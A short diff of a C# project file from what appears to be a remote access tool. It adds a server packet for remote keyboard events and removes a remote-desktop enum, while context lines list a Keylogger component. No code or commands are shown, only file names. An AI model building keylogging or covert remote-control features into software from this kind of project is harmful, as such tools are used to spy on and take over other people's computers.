@@ -71,6 +71,7 @@
     <Compile Include="Core\Encryption\AES.cs" />
     <Compile Include="Core\Encryption\SHA256.cs" />
     <Compile Include="Core\Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoKeyboardEvent.cs" />
     <Compile Include="Core\Utilities\FileSplit.cs" />
     <Compile Include="Core\Utilities\NativeMethods.cs" />
     <Compile Include="Core\Utilities\UnsafeStreamCodec.cs" />
@@ -258,7 +259,6 @@
     <Compile Include="Core\Utilities\Keylogger.cs" />
     <Compile Include="Enums\MouseAction.cs" />
     <Compile Include="Enums\PathType.cs" />
-    <Compile Include="Enums\RemoteDesktopAction.cs" />
     <Compile Include="Enums\ShutdownAction.cs" />
     <Compile Include="Enums\UserStatus.cs" />
     <Compile Include="Program.cs" />
